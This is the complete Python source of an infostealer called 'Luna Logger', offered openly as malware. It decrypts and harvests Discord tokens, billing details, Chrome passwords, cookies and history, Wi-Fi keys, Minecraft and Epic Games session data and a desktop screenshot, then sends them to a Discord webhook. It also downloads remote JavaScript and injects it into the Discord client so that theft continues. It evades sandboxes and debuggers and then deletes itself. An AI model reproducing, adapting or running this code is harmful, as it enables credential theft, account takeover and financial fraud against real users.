import os
import platform
import re
import threading
import uuid
import requests
import wmi
import subprocess
import sqlite3
import psutil
import json
import base64

from re import findall
from shutil import copy2
from base64 import b64decode
from subprocess import PIPE, Popen
from sys import exit
from zipfile import ZipFile
from Crypto.Cipher import AES
from discord import Embed, File, SyncWebhook
from PIL import ImageGrab
from win32api import SetFileAttributes
from win32con import FILE_ATTRIBUTE_HIDDEN
from win32crypt import CryptUnprotectData

__WEBHOOK__ = "%webhook_here%"
__PING__ = "%ping_enabled%"
__PINGTYPE__ = "%ping_type%"

def main(webhook: str):
    global embed

    webhook = SyncWebhook.from_url(webhook, session=requests.Session())
    embed = Embed(title="Luna Logger", color=5639644)

    get_inf()
    grabtokens()

    threads = [ss, chrome, grabwifi, mc_tokens, epicgames_data]

    for func in threads:
        process = threading.Thread(target=func, daemon=True)
        process.start()
    for t in threading.enumerate():
        try:
            t.join()
        except RuntimeError:
            continue

    embed.set_footer(text="Luna Logger | Created by Smug")
    embed.set_thumbnail(url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096")

    zipup()

    _file = None
    _file = File(f'Luna-Logged-{os.getenv("Username")}.zip')

    content = ""
    if __PING__:
        if __PINGTYPE__ == "everyone":
            content += "@everyone"
        elif __PINGTYPE__ == "here":
            content += "@here"

    webhook.send(
        content=content,
        embed=embed,
        file=_file,
        avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
        username="Luna")

def Luna(webhook: str):
    debug()

    procs = [
        main,
        inject,
    ]

    for proc in procs:
        proc(webhook)

    cleanup()

def try_extract(func):
    def wrapper(*args, **kwargs):
        try:
            func(*args, **kwargs)
        except Exception:
            pass
    return wrapper

def get_inf():

    ip_address = requests.get('http://ipinfo.io/json').json()['ip']
    mac_address = ':'.join(findall('..', '%012x' % uuid.getnode()))

    p = Popen("wmic csproduct get uuid", shell=True,
              stdin=PIPE, stdout=PIPE, stderr=PIPE)
    hwid = ((p.stdout.read() + p.stderr.read()).decode().split("\n")[1])

    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    computer_os = platform.platform()

    cpu = wmi.WMI().Win32_Processor()[0]
    gpu = wmi.WMI().Win32_VideoController()[0]
    ram = round(float(wmi.WMI().Win32_OperatingSystem()[
                0].TotalVisibleMemorySize) / 1048576, 0)

    embed.add_field(
        name="SYSTEM INFO",
        value=f'''💻 `PC Username:` **{pc_username}**\n<:computer_2:996126609650225322> `PC Name:` **{pc_name}**\n🌐 `OS:` **{computer_os}**\n\n👀 `IP:` **{ip_address}**\n🍏 `MAC:` **{mac_address}**\n🔧 `HWID:` **{hwid}**<:cpu:996126314555768882> `CPU:` **{cpu.Name}**\n<:gpu:996126996952272906> `GPU:` **{gpu.Name}**\n<:rgbram:996127801025495081> `RAM:` **{ram}GB**''',
        inline=False)

class grabtokens():
    def __init__(self) -> None:
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"

        self.tokens = []
        self.ids = []

        self.grabTokens()
        self.upload()

    def decrypt_val(self, buff, master_key) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    def get_master_key(self, path) -> str:
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def grabTokens(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [
                            x.strip() for x in open(
                                f'{path}\\{file_name}',
                                errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                try:
                                    token = self.decrypt_val(
                                        base64.b64decode(
                                            y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(
                                            self.roaming + f'\\{disc}\\Local State'))
                                except ValueError:
                                    pass
                                try:
                                    r = requests.get(self.baseurl,headers={
                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                        'Content-Type': 'application/json',
                                        'Authorization': token})
                                except Exception:
                                        pass
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [
                        x.strip() for x in open(
                            f'{path}\\{file_name}',
                            errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl,headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                            except Exception:
                                    pass
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)


        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(
                    self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [
                        x.strip() for x in open(
                            f'{path}\\{_file}',
                            errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl,headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                            except Exception:
                                    pass
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

    def upload(self):
        for token in self.tokens:
            val = ""
            val_name = ""

            r = requests.get(
                'https://discord.com/api/v9/users/@me',
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                    'Content-Type': 'application/json',
                    'Authorization': token})

            discord_id = r.json()['id']
            username = r.json()['username'] + '#' + r.json()['discriminator']
            phone = r.json()['phone']
            email = r.json()['email']

            val_name += f'{username}'

            try:
                if r.json()['mfa_enabled']:
                    mfa = "✅"
                else:
                    mfa = "❌"
            except Exception:
                mfa = "❌"

            try:
                if r.json()['premium_type'] == 1:
                    nitro = 'Nitro Classic'
                elif r.json()['premium_type'] == 2:
                    nitro = 'Nitro Boost'
            except BaseException:
                nitro = 'None'

            b = requests.get(
                "https://discord.com/api/v6/users/@me/billing/payment-sources",
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                    'Content-Type': 'application/json',
                    'Authorization': token})

            if b.json() == []:
                methods = "None"
            else:
                methods = ""
                try:
                    for method in b.json():
                        if method['type'] == 1: 
                            methods += "💳"
                        elif method['type'] == 2: 
                            methods += "<:paypal:973417655627288666>"
                        else: 
                            methods += "❓"
                except TypeError: 
                    methods += "❓"

            val += f'<:1119pepesneakyevil:972703371221954630> `Discord ID:` **{discord_id}** \n<:gmail:996083031632773181> `Email:` **{email}**\n<:mobilephone:996101721879224331> `Phone:` **{phone}**\n\n<:2fa:996102455744012428> `2FA:` **{mfa}**\n<a:nitroboost:996004213354139658> `Nitro:` **{nitro}**\n<:billing:996099943574012024> `Billing:` **{methods}**\n\n<:pepehappy:996100452112400526> `Token:` **{token}**\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n'

            g = requests.get(
                "https://discord.com/api/v9/users/@me/outbound-promotions/codes",
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                    'Content-Type': 'application/json',
                    'Authorization': token})
            val_codes = []
            if "code" in g.text:
                codes = json.loads(g.text)
                try:
                    for code in codes:
                        val_codes.append(
                            (code['code'], code['promotion']['outbound_title']))
                except TypeError:
                    pass
                    
            if val_codes == []:
                val += f'\n:gift: **None**\n'
            else:
                for c, t in val_codes:
                    val += f'\n:gift: `{t}:`\n**{c}**\n[Click to copy!](https://paste-pgpj.onrender.com/?p={c})\n'

            embed.add_field(name=val_name, value=val, inline=False)

def ss():
    ImageGrab.grab(
        bbox=None,
        include_layered_windows=False,
        all_screens=True,
        xdisplay=None
    ).save("desktop-screenshot.png")
    hide("desktop-screenshot.png")

@try_extract
class chrome():
    def __init__(self) -> None:
        self.roaming = os.getenv('APPDATA')
        self.local = os.getenv('LOCALAPPDATA')
        self.masterkey = self.get_master_key()

        self.google_paths = [
            self.local + '\\Google\\Chrome\\User Data\\Default',
            self.local + '\\Google\\Chrome\\User Data\\Profile 1',
            self.local + '\\Google\\Chrome\\User Data\\Profile 2',
            self.local + '\\Google\\Chrome\\User Data\\Profile 3',
            self.local + '\\Google\\Chrome\\User Data\\Profile 4',
            self.local + '\\Google\\Chrome\\User Data\\Profile 5',
        ]

        self.passwords()
        self.cookies()
        self.history()

    def get_master_key(self):
        with open(self.local + '\\Google\\Chrome\\User Data\\Local State', "r", encoding="utf-8") as f:
            local_state = f.read()
        local_state = json.loads(local_state)

        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def decrypt_password(self, buff, master_key):
        try:
            iv, payload = buff[3:15], buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Chrome < 80"

    def passwords(self):
        with open(".\\google-passwords.txt", "w", encoding="utf-8") as f:
            f.write("https://github.com/Smug246 | Google Chrome Passwords\n\n")

        for path in self.google_paths:
            path += '\\Login Data'
            if os.path.exists(path):
                copy2(path, "Loginvault.db")
                conn = sqlite3.connect("Loginvault.db")
                cursor = conn.cursor()
                with open(".\\google-passwords.txt", "a", encoding="utf-8") as f:
                    for result in cursor.execute(
                            "SELECT action_url, username_value, password_value FROM logins"):
                        url, username, password = result
                        password = self.decrypt_password(
                            password, self.masterkey)
                        if url and username and password != "":
                            f.write(
                                "Username: {:<30} | Password: {:<30} | Site: {:<30}\n".format(
                                    username, password, url))
                cursor.close()
                conn.close()
                os.remove("Loginvault.db")
        hide("google-passwords.txt")

    def cookies(self):
        with open(".\\google-cookies.txt", "w", encoding="utf-8") as f:
            f.write("https://github.com/Smug246 | Google Chrome Cookies\n\n")

        for path in self.google_paths:
            path += '\\Network\\Cookies'
            if os.path.exists(path):
                copy2(path, "Cookievault.db")
                conn = sqlite3.connect("Cookievault.db")
                cursor = conn.cursor()
                with open(".\\google-cookies.txt", "a", encoding="utf-8") as f:
                    for result in cursor.execute(
                            "SELECT host_key, name, encrypted_value from cookies"):
                        host, name, value = result
                        value = self.decrypt_password(value, self.masterkey)
                        if host and name and value != "":
                            f.write(
                                "Site: {:<30} | Name: {:<30} | Value: {:<30}\n".format(
                                    host, name, value))
                cursor.close()
                conn.close()
                os.remove("Cookievault.db")
        hide("google-cookies.txt")

    def history(self):
        with open(".\\google-history.txt", "w", encoding="utf-8") as f:
            f.write("https://github.com/Smug246 | Google Chrome History\n\n")
    
        for path in self.google_paths:
            path += '\\History'
            if os.path.exists(path):
                copy2(path, "Historyvault.db")
                conn = sqlite3.connect("Historyvault.db")
                cursor = conn.cursor()
                sites = []
                with open(".\\google-history.txt", "a", encoding="utf-8") as f:
                    for result in cursor.execute(
                            "SELECT url, title, visit_count, last_visit_time FROM urls"):
                        url, title, visit_count, last_visit_time = result
                        if url and title and visit_count and last_visit_time != "":
                            sites.append(
                                (url, title, visit_count, last_visit_time))
                        sites.sort(key=lambda x: x[3], reverse=True)
                    for site in sites:
                        f.write(
                            "Occurrences: {:<4} | Site: {:<10}\n".format(
                                site[2], site[1]))

                cursor.close()
                conn.close()
                os.remove("Historyvault.db")

        hide("google-history.txt")

@try_extract
class grabwifi:
    def __init__(self):
        self.wifi_list = []
        self.name_pass = {}

        with open(".\\wifi-passwords.txt", "w", encoding="cp437", errors='ignore') as f:
            f.write("https://github.com/Smug246 | Wifi Networks & Passwords\n\n")
        hide(".\\wifi-passwords.txt")

        data = subprocess.getoutput('netsh wlan show profiles').split('\n')
        for line in data:
            if 'All User Profile' in line:
                self.wifi_list.append(line.split(":")[-1][1:])
            else:
                with open(".\\wifi-passwords.txt", "a") as f:
                    f.write(
                        f'There is no wireless interface on the system. Ethernet using twat.')
                f.close()

        for i in self.wifi_list:
            command = subprocess.getoutput(
                f'netsh wlan show profile "{i}" key=clear')
            if "Key Content" in command:
                split_key = command.split('Key Content')
                tmp = split_key[1].split('\n')[0]
                key = tmp.split(': ')[1]
                self.name_pass[i] = key
            else:
                key = ""
                self.name_pass[i] = key

        with open(".\\wifi-passwords.txt", "a") as f:
            for i, j in self.name_pass.items():
                f.write(f'Wifi Name : {i} | Password : {j}\n')
        f.close()

@try_extract
class mc_tokens():
    def __init__(self):
        self.roaming = os.getenv("appdata")

        self.session_info()
        self.user_cache()

    def session_info(self):
        with open((".\\minecraft-sessioninfo.json"), 'w', encoding="cp437", errors='ignore') as f:
            if os.path.exists(self.roaming +
                              "\\.minecraft\\launcher_accounts.json"):
                with open(self.roaming + "\\.minecraft\\launcher_accounts.json", "r") as g:
                    self.session = json.load(g)
                    f.write(json.dumps(self.session, indent=4))
            else:
                f.write("No minecraft accounts or access tokens :(")
        hide(".\\minecraft-sessioninfo.json")

    def user_cache(self):
        with open((".\\minecraft-usercache.json"), 'w', encoding="cp437", errors='ignore') as f:
            if os.path.exists(self.roaming + "\\.minecraft\\usercache.json"):
                with open(self.roaming + "\\.minecraft\\usercache.json", "r") as g:
                    self.user = json.load(g)
                    f.write(json.dumps(self.user, indent=4))
            else:
                f.write("No minecraft accounts or access tokens :(")
        hide(".\\minecraft-usercache.json")

@try_extract
class epicgames_data():
    def __init__(self):
        self.local = os.getenv("localappdata")
        self.epic = self.local + \
            "\\EpicGamesLauncher\\Saved\\Config\\Windows\\GameUserSettings.ini"

        self.get_data()

    def get_data(self):
        with open((".\\epicgames-data.txt"), 'w', encoding="cp437", errors='ignore') as g:
            g.write("https://github.com/Smug246 | Epic Games Offline Data\n\n")
            if os.path.exists(self.epic):
                with open(self.epic, "r") as f:
                    for line in f.readlines():
                        if line.startswith("Data="):
                            g.write(line.split('Data=')[1].strip())
            else:
                g.write("No epic games data was found :(")
        hide(".\\epicgames-data.txt")

def zipup():
    with ZipFile(f'Luna-Logged-{os.getenv("Username")}.zip', 'w') as zipf:
        zipf.write("google-passwords.txt")
        zipf.write("google-cookies.txt")
        zipf.write("google-history.txt")
        zipf.write("wifi-passwords.txt")
        zipf.write("minecraft-sessioninfo.json")
        zipf.write("minecraft-usercache.json")
        zipf.write("epicgames-data.txt")
        zipf.write("desktop-screenshot.png")
    hide(f'Luna-Logged-{os.getenv("Username")}.zip')

def cleanup():
    for clean in [os.remove("google-passwords.txt"),
                  os.remove("google-cookies.txt"),
                  os.remove("google-history.txt"),
                  os.remove("wifi-passwords.txt"),
                  os.remove("minecraft-usercache.json"),
                  os.remove("minecraft-sessioninfo.json"),
                  os.remove("epicgames-data.txt"),
                  os.remove("desktop-screenshot.png"),
                  os.remove(f"Luna-Logged-{os.getenv('Username')}.zip")]:
        try:
            clean()
        except Exception:
            pass

def hide(file):
    SetFileAttributes(file, FILE_ATTRIBUTE_HIDDEN)

class inject:
    def __init__(self, webhook: str):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.discord_dirs = [
            self.appdata + '\\Discord',
            self.appdata + '\\DiscordCanary',
            self.appdata + '\\DiscordPTB',
            self.appdata + '\\DiscordDevelopment'
        ]
        self.code = requests.get(
            "https://raw.githubusercontent.com/Smug246/Luna-Token-Grabber/main/injection.js").text

        for dir in self.discord_dirs:
            if not os.path.exists(dir):
                continue

            if self.get_core(dir) is not None:
                with open(self.get_core(dir)[0] + '\\index.js', 'w', encoding='utf-8') as f:
                    f.write(
                        (self.code).replace(
                            'discord_desktop_core-1',
                            self.get_core(dir)[1]).replace(
                            '%WEBHOOK%',
                            webhook))
                    self.start_discord(dir)

    def get_core(self, dir: str):
        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                modules = dir + '\\' + file + '\\modules'
                if not os.path.exists(modules):
                    continue
                for file in os.listdir(modules):
                    if re.search(r'discord_desktop_core-+?', file):
                        core = modules + '\\' + file + '\\' + 'discord_desktop_core'
                        if not os.path.exists(core + '\\index.js'):
                            continue

                        return core, file

    def start_discord(self, dir: str):
        update = dir + '\\Update.exe'
        executable = dir.split('\\')[-1] + '.exe'

        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                app = dir + '\\' + file
                if os.path.exists(app + '\\' + 'modules'):
                    for file in os.listdir(app):
                        if file == executable:
                            executable = app + '\\' + executable
                            subprocess.call([update,
                                             '--processStart',
                                             executable],
                                            shell=True,
                                            stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE)

class debug:
    def __init__(self):
        if self.checks():
            self.self_destruct()

    def checks(self):
        debugging = False

        # blackList from Rdimo
        self.blackListedUsers = [
            "WDAGUtilityAccount",
            "Abby",
            "Peter Wilson",
            "hmarc",
            "patex",
            "JOHN-PC",
            "RDhJ0CNFevzX",
            "kEecfMwgj",
            "Frank",
            "8Nl0ColNQ5bq",
            "Lisa",
            "John",
            "george",
            "PxmdUOpVyx",
            "8VizSM",
            "w0fjuOVmCcP5A",
            "lmVwjj9b",
            "PqONjHVwexsS",
            "3u2v9m8",
            "Julia",
            "HEUeRzl",
        ]
        self.blackListedPCNames = [
            "BEE7370C-8C0C-4",
            "DESKTOP-NAKFFMT",
            "WIN-5E07COS9ALR",
            "B30F0242-1C6A-4",
            "DESKTOP-VRSQLAG",
            "Q9IATRKPRH",
            "XC64ZB",
            "DESKTOP-D019GDM",
            "DESKTOP-WI8CLET",
            "SERVER1",
            "LISA-PC",
            "JOHN-PC",
            "DESKTOP-B0T93D6",
            "DESKTOP-1PYKP29",
            "DESKTOP-1Y2433R",
            "WILEYPC",
            "WORK",
            "6C4E733F-C2D9-4",
            "RALPHS-PC",
            "DESKTOP-WG3MYJS",
            "DESKTOP-7XC6GEZ",
            "DESKTOP-5OV9S0O",
            "QarZhrdBpj",
            "ORELEEPC",
            "ARCHIBALDPC",
            "JULIA-PC",
            "d1bnJkfVlH",
        ]
        self.blackListedHWIDS = [
            "7AB5C494-39F5-4941-9163-47F54D6D5016",
            "032E02B4-0499-05C3-0806-3C0700080009",
            "03DE0294-0480-05DE-1A06-350700080009",
            "11111111-2222-3333-4444-555555555555",
            "6F3CA5EC-BEC9-4A4D-8274-11168F640058",
            "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548",
            "4C4C4544-0050-3710-8058-CAC04F59344A",
            "00000000-0000-0000-0000-AC1F6BD04972",
            "00000000-0000-0000-0000-000000000000",
            "5BD24D56-789F-8468-7CDC-CAA7222CC121",
            "49434D53-0200-9065-2500-65902500E439",
            "49434D53-0200-9036-2500-36902500F022",
            "777D84B3-88D1-451C-93E4-D235177420A7",
            "49434D53-0200-9036-2500-369025000C65",
            "B1112042-52E8-E25B-3655-6A4F54155DBF",
            "00000000-0000-0000-0000-AC1F6BD048FE",
            "EB16924B-FB6D-4FA1-8666-17B91F62FB37",
            "A15A930C-8251-9645-AF63-E45AD728C20C",
            "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3",
            "C7D23342-A5D4-68A1-59AC-CF40F735B363",
            "63203342-0EB0-AA1A-4DF5-3FB37DBB0670",
            "44B94D56-65AB-DC02-86A0-98143A7423BF",
            "6608003F-ECE4-494E-B07E-1C4615D1D93C",
            "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A",
            "49434D53-0200-9036-2500-369025003AF0",
            "8B4E8278-525C-7343-B825-280AEBCD3BCB",
            "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27",
            "79AF5279-16CF-4094-9758-F88A616D81B4",
        ]
        self.blackListedIPS = [
            "88.132.231.71",
            "78.139.8.50",
            "20.99.160.173",
            "88.153.199.169",
            "84.147.62.12",
            "194.154.78.160",
            "92.211.109.160",
            "195.74.76.222",
            "188.105.91.116",
            "34.105.183.68",
            "92.211.55.199",
            "79.104.209.33",
            "95.25.204.90",
            "34.145.89.174",
            "109.74.154.90",
            "109.145.173.169",
            "34.141.146.114",
            "212.119.227.151",
            "195.239.51.59",
            "192.40.57.234",
            "64.124.12.162",
            "34.142.74.220",
            "188.105.91.173",
            "109.74.154.91",
            "34.105.72.241",
            "109.74.154.92",
            "213.33.142.50",
        ]
        self.blacklistedProcesses = [
            "HTTP Toolkit.exe",
            "Fiddler.exe",
            "Wireshark.exe",
            "HTTPDebuggerUI.exe"]

        self.check_process()

        if self.get_ip():
            debugging = True
        if self.get_hwid():
            debugging = True
        if self.get_pcname():
            debugging = True
        if self.get_username():
            debugging = True
        return debugging

    def check_process(self):
        for process in self.blacklistedProcesses:
            if process in (p.name() for p in psutil.process_iter()):
                self.self_destruct()

    def get_ip(self):
        ip = requests.get('http://ipinfo.io/json').json()['ip']

        if ip in self.blackListedIPS:
            return True

    def get_hwid(self):
        p = Popen("wmic csproduct get uuid", shell=True,
                  stdin=PIPE, stdout=PIPE, stderr=PIPE)
        hwid = (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]

        if hwid in self.blackListedHWIDS:
            return True

    def get_pcname(self):
        pc_name = os.getenv("COMPUTERNAME")

        if pc_name in self.blackListedPCNames:
            return True

    def get_username(self):
        pc_username = os.getenv("UserName")

        if pc_username in self.blackListedUsers:
            return True

    def self_destruct(self):
        os.system("del {}\\{}".format(os.path.dirname(
            __file__), os.path.basename(__file__)))
        exit()

if __name__ == '__main__' and os.name == "nt":
    Luna(__WEBHOOK__)
